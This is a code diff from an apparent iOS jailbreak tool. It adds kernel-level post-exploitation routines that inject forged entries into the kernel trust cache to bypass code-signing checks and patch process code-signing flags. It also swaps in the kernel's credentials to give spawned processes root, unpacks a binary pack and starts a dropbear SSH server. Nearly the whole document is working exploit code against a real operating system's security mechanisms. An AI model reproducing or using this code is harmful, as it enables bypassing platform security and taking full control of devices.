@@ -7,10 +7,14 @@
 //
 
 #include "fun.h"
+#include "kcall.h"
 #include <dlfcn.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
+
+// export PATH="$BOOTSTRAP_PREFIX/usr/local/bin:$BOOTSTRAP_PREFIX/usr/sbin:$BOOTSTRAP_PREFIX/usr/bin:$BOOTSTRAP_PREFIX/sbin:$BOOTSTRAP_PREFIX/bin"
+#define BOOTSTRAP_PREFIX "bootstrap"
 
 int cp(const char *to, const char *from)
 {
@@ -94,56 +98,82 @@ uint32_t swap_uint32( uint32_t val )
 	return (val << 16) | (val >> 16);
 }
 
-uint8_t *getSHA256(uint8_t* code_dir) {
+void getSHA256inplace(const uint8_t* code_dir, uint8_t *out) {
+    if (code_dir == NULL) {
+        printf("NULL passed to getSHA256inplace!\n");
+        return;
+    }
+    uint32_t* code_dir_int = (uint32_t*)code_dir;
+
+    uint32_t realsize = 0;
+    for (int j = 0; j < 10; j++) {
+        if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
+            realsize = swap_uint32(code_dir_int[j+1]);
+            code_dir += 4*j;
+        }
+    }
+//    printf("%08x\n", realsize);
+
+    CC_SHA256(code_dir, realsize, out);
+}
+
+uint8_t *getSHA256(const uint8_t* code_dir) {
 	uint8_t *out = malloc(CC_SHA256_DIGEST_LENGTH);
-	
-	uint32_t* code_dir_int = (uint32_t*)code_dir;
-	
-	uint32_t realsize = 0;
-	for (int j = 0; j < 10; j++) {
-		if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
-			realsize = swap_uint32(code_dir_int[j+1]);
-			code_dir += 4*j;
-		}
-	}
-	printf("%08x\n", realsize);
-	
-	CC_SHA256(code_dir, realsize, out);
-	
-	return out;
+    getSHA256inplace(code_dir, out);
+    return out;
 }
 
 #include <mach-o/loader.h>
 uint8_t *getCodeDirectory(const char* name) {
-	// Assuming it is a macho
-	
-	FILE* fd = fopen(name, "r");
-	
-	struct mach_header_64 mh;
-	fread(&mh, sizeof(struct mach_header_64), 1, fd);
-	
-	long off = sizeof(struct mach_header_64);
-	for (int i = 0; i < mh.ncmds; i++) {
-		const struct load_command cmd;
-		fseek(fd, off, SEEK_SET);
-		fread(&cmd, sizeof(struct load_command), 1, fd);
-		if (cmd.cmd == 0x1d) {
-			uint32_t off_cs;
-			fread(&off_cs, sizeof(uint32_t), 1, fd);
-			uint32_t size_cs;
-			fread(&size_cs, sizeof(uint32_t), 1, fd);
-			printf("%d - %d\n", off_cs, size_cs);
-			
-			uint8_t *cd = malloc(size_cs);
-			fseek(fd, off_cs, SEEK_SET);
-			fread(cd, size_cs, 1, fd);
-			return cd;
-		} else {
-			printf("%02x\n", cmd.cmd);
-			off += cmd.cmdsize;
-		}
-	}
-	return NULL;
+    // Assuming it is a macho
+
+    FILE* fd = fopen(name, "r");
+
+    uint32_t magic;
+    fread(&magic, sizeof(magic), 1, fd);
+    fseek(fd, 0, SEEK_SET);
+
+    long off;
+    int ncmds;
+
+    if (magic == MH_MAGIC_64) {
+//        printf("%s is 64bit macho\n", name);
+        struct mach_header_64 mh64;
+        fread(&mh64, sizeof(mh64), 1, fd);
+        off = sizeof(mh64);
+        ncmds = mh64.ncmds;
+    } else if (magic == MH_MAGIC) {
+        struct mach_header mh;
+//        printf("%s is 32bit macho\n", name);
+        fread(&mh, sizeof(mh), 1, fd);
+        off = sizeof(mh);
+        ncmds = mh.ncmds;
+    } else {
+        printf("%s is not a macho! (or has foreign endianness?)\n", name);
+        return NULL;
+    }
+
+    for (int i = 0; i < ncmds; i++) {
+        struct load_command cmd;
+        fseek(fd, off, SEEK_SET);
+        fread(&cmd, sizeof(struct load_command), 1, fd);
+        if (cmd.cmd == LC_CODE_SIGNATURE) {
+            uint32_t off_cs;
+            fread(&off_cs, sizeof(uint32_t), 1, fd);
+            uint32_t size_cs;
+            fread(&size_cs, sizeof(uint32_t), 1, fd);
+//            printf("found CS in '%s': %d - %d\n", name, off_cs, size_cs);
+
+            uint8_t *cd = malloc(size_cs);
+            fseek(fd, off_cs, SEEK_SET);
+            fread(cd, size_cs, 1, fd);
+            return cd;
+        } else {
+//            printf("'%s': loadcmd %02x\n", name, cmd.cmd);
+            off += cmd.cmdsize;
+        }
+    }
+    return NULL;
 }
 
 unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
@@ -403,87 +433,43 @@ do { \
 	
 	printf("Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
 	
-	uint64_t tc = find_trustcache();
-	printf("trust cache at: %016llx\n", rk64(tc));
-	
 //	uint8_t launchd[19];
 //	kread(find_amficache()+0x11358, launchd, 19);
 //
 //	uint8_t really[19] = {0xdb, 0x75, 0x57, 0x7d, 0x9c, 0x5c, 0xc2, 0xe7, 0x83, 0x7d, 0xa8, 0x66, 0x6a, 0x05, 0xc7, 0x17, 0x7e, 0xdb, 0xd3};
 //
 //	printf("%d\n", memcmp(launchd, really, 19)); // == 0
-	
-	typedef char hash_t[20];
-	
-	struct trust_chain {
-		uint64_t next; 				// +0x00 - the next struct trust_mem
-		unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
-		unsigned int count;			// +0x18 - Number of hashes there are
-		hash_t hash[2];		// +0x1C - The hashes
-	};
-	
-	struct trust_chain fake_chain;
-	
-	fake_chain.next = rk64(tc);
-	*(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
-	*(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
-	fake_chain.count = 2;
+
 	
 //	mkdir("/Library/LaunchDaemons", 777);
 //	cp("/Library/LaunchDaemons/test_fsigned.plist", plistPath2());
-	
-#define BinaryLocation "/usr/bin/test_fsigned"
-	
-	unlink(BinaryLocation);
-	cp(BinaryLocation, binaryName());
-	chmod(BinaryLocation, 777);
-	chmod(launchctlpath(), 777);
-	
 
-	uint8_t *hash = getSHA256(getCodeDirectory(BinaryLocation));
-	uint8_t *hash2 = getSHA256(getCodeDirectory(launchctlpath())); // launchctl doesn't seem to be working - null object is returned
-	
-	memmove(fake_chain.hash[0], hash2, 20); // Order doesn't matter
-	memmove(fake_chain.hash[1], hash, 20);
-	
-	uint64_t kernel_trust = kalloc(sizeof(fake_chain));
-	kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
-	// Comment this line out to see `amfid` saying there is no signature on test_fsigned (or your binary)
-	wk64(tc, kernel_trust);
-	
-	pid_t pd;
-	
-	int rv = posix_spawn(&pd, BinaryLocation, NULL, NULL, (char **)&(const char*[]){ BinaryLocation, NULL }, NULL);
-	printf("%d\n", pd);
-	printf("rv=%d\n", rv);
-	
-	int tries = 3;
-	while (tries-- > 0) {
-		sleep(1);
-		uint64_t proc = rk64(find_allproc());
-		while (proc) {
-			uint32_t pid = rk32(proc + offsetof_p_pid);
-			if (pid == pd) {
-				uint32_t csflags = rk32(proc + offsetof_p_csflags);
-				csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
-				wk32(proc + offsetof_p_csflags, csflags);
-				printf("empower\n");
-				tries = 0;
-				uint64_t self_ucred = 0;
-				KCALL(find_copyout(), proc+0x100, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
-				
-				KCALL(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
-				KCALL(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
-				break;
-			}
-			proc = rk64(proc);
-		}
-	}
-	
-	waitpid(pd, NULL, 0);
+    mkdir("/" BOOTSTRAP_PREFIX, 0777);
+    const char *tar = "/" BOOTSTRAP_PREFIX "/tar";
+    cp(tar, progname("tar"));
+    chmod(tar, 0777);
+    inject_trusts(1, (const char **)&(const char*[]){tar});
+
+    int rv;
+    rv = startprog(kern_ucred, tar, (char **)&(const char*[]){ tar, "-xpf", progname("binpack.tar"), "-C", "/" BOOTSTRAP_PREFIX, NULL });
+    unlink(tar);
+
+    int process_binlist(const char *path);
+    rv = process_binlist("/" BOOTSTRAP_PREFIX "/binlist.txt");
+
+    if (rv == 0) {
+        printf("Dropbear would be up soon\n");
+        printf("Please run after SSH: \n --- \n");
+        printf("BOOTSTRAP_PREFIX=\"/" BOOTSTRAP_PREFIX "\"\n");
+        printf("export PATH=\"$BOOTSTRAP_PREFIX/usr/local/bin:$BOOTSTRAP_PREFIX/usr/sbin:$BOOTSTRAP_PREFIX/usr/bin:$BOOTSTRAP_PREFIX/sbin:$BOOTSTRAP_PREFIX/bin\"\n");
+        printf(" --- \n");
+        const char *dbear = "/" BOOTSTRAP_PREFIX "/usr/local/bin/dropbear";
+        rv = startprog(kern_ucred, dbear, (char **)&(const char*[]){ dbear, "-E", "-m", "-F", "-S", "/" BOOTSTRAP_PREFIX, NULL });
+    }
+
 //	sleep(5);
 //	kill(pd, SIGKILL);
-	
+
 	if (container_proc) {
 		wk64(container_proc + offsetof_p_ucred, ccred);
 	}
@@ -524,7 +510,180 @@ do { \
 	 */
 	
 	// Cleanup
-	
+
 	wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
 	
+}
+
+
+void inject_trust(const char *path) {
+    printf("Trusting '%s'\n", path);
+    // TODO: try to optimize by finding trustcache once and/or adding more than one hash in chain
+    uint64_t tc = find_trustcache();
+//    printf("trust cache at: %016llx\n", rk64(tc));
+
+    typedef char hash_t[20];
+
+    struct trust_chain {
+        uint64_t next;                 // +0x00 - the next struct trust_mem
+        unsigned char uuid[16];        // +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
+        unsigned int count;            // +0x18 - Number of hashes there are
+        hash_t hash[1];                // +0x1C - The hashes
+    };
+
+    struct trust_chain fake_chain;
+
+    static uint64_t last_injected = 0;
+
+    fake_chain.next = rk64(tc);
+    *(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
+    *(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
+    fake_chain.count = 1;
+
+    uint8_t *hash = getSHA256(getCodeDirectory(path));
+    memmove(fake_chain.hash[0], hash, 20);
+    free(hash);
+
+    uint64_t kernel_trust = kalloc(sizeof(fake_chain));
+    kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
+    last_injected = kernel_trust;
+
+    // Comment this line out to see `amfid` saying there is no signature on test_fsigned (or your binary)
+    wk64(tc, kernel_trust);
+}
+
+void inject_trusts(int pathc, const char *paths[]) {
+    for (int i = 0; i != pathc; ++i) {
+        inject_trust(paths[i]);
+    }
+    return;
+
+    typedef char hash_t[20];
+
+    struct trust_chain {
+        uint64_t next;                 // +0x00 - the next struct trust_mem
+        unsigned char uuid[16];        // +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
+        unsigned int count;            // +0x18 - Number of hashes there are
+        // hash_t hash[pathc];             // +0x1C - The hashes
+    };
+
+    int chain_size = sizeof(struct trust_chain) + pathc * sizeof(hash_t);
+    struct trust_chain* fake_chain = malloc(chain_size);
+
+    uint8_t hashto[CC_SHA256_DIGEST_LENGTH];
+
+    hash_t *cur_hash = (hash_t *)((uint8_t*)fake_chain + sizeof(fake_chain));
+    for (int i = 0; i != pathc; ++i) {
+        getSHA256inplace(getCodeDirectory(paths[i]), hashto);
+        memmove(cur_hash, hashto, 20);
+        ++cur_hash;
+    }
+
+    *(uint64_t *)&fake_chain->uuid[0] = 0xabadbabeabadbabe;
+    *(uint64_t *)&fake_chain->uuid[8] = 0xabadbabeabadbabe;
+    fake_chain->count = pathc;
+
+    uint64_t tc = find_trustcache();
+
+    printf("trust cache at: %016llx\n", rk64(tc));
+
+    fake_chain->next = rk64(tc);
+
+    uint64_t kernel_trust = kalloc(chain_size);
+    kwrite(kernel_trust, fake_chain, chain_size);
+
+    free(fake_chain);
+
+    // Comment this line out to see `amfid` saying there is no signature on test_fsigned (or your binary)
+    wk64(tc, kernel_trust);
+}
+
+
+int process_binlist(const char *path) {
+    // first line -- count since I'm too lazy
+
+    FILE *binlist = fopen(path, "r");
+
+    if (binlist == NULL) {
+        printf("WTF no binlist?!\n");
+        return -1;
+    }
+
+    int pathcount;
+    fscanf(binlist, " %u", &pathcount);
+
+    char **paths = malloc(sizeof(char*) * pathcount);
+    size_t len = 4096;
+    ssize_t nread;
+    char readpath[4096];
+
+    strcpy(readpath, "/" BOOTSTRAP_PREFIX "/");
+    char *readto = readpath + strlen("/" BOOTSTRAP_PREFIX "/");
+
+    int i;
+    for (i = 0; i != pathcount;) {
+        // XXX can getline change readto?..
+        nread = getline(&readto, &len, binlist);
+
+        if (nread == -1) break;
+        if (readto[nread - 1] == '\n') readto[nread - 1] = '\0';
+
+        struct stat statmedaddy;
+        int rv = stat(readpath, &statmedaddy);
+        if (rv == 0 && S_ISREG(statmedaddy.st_mode)) {
+            paths[i] = strdup(readpath);
+            ++i;
+        } else {
+            printf("(/" BOOTSTRAP_PREFIX "/)'%s' in binlist but isn't file/doesn't exist\n", readto);
+        }
+    }
+
+    // XXX can be negative huh
+    pathcount = i - 1;
+
+    inject_trusts(pathcount, (const char**)paths);
+
+    for (i = 0; i != pathcount; ++i) {
+        free(paths[i]);
+    }
+    free(paths);
+    fclose(binlist);
+
+    return 0;
+}
+
+
+int startprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
+    pid_t pd;
+    int rv = posix_spawn(&pd, prog, NULL, NULL, (char**)args, NULL);
+    printf("spawn '%s': pid=%d\n", prog, pd);
+    printf("rv=%d\n", rv);
+
+    if (kern_ucred != 0) {
+        int tries = 3;
+        while (tries-- > 0) {
+            sleep(1);
+            uint64_t proc = rk64(find_allproc());
+            while (proc) {
+                uint32_t pid = rk32(proc + offsetof_p_pid);
+                if (pid == pd) {
+                    uint32_t csflags = rk32(proc + offsetof_p_csflags);
+                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
+                    wk32(proc + offsetof_p_csflags, csflags);
+                    printf("empower\n");
+                    tries = 0;
+                    uint64_t self_ucred = 0;
+                    kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
+
+                    kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
+                    kcall(find_bzero(), 2, self_ucred + 0x18, 12);
+                    break;
+                }
+                proc = rk64(proc);
+            }
+        }
+    }
+
+    waitpid(pd, NULL, 0);
+    return rv;
 }
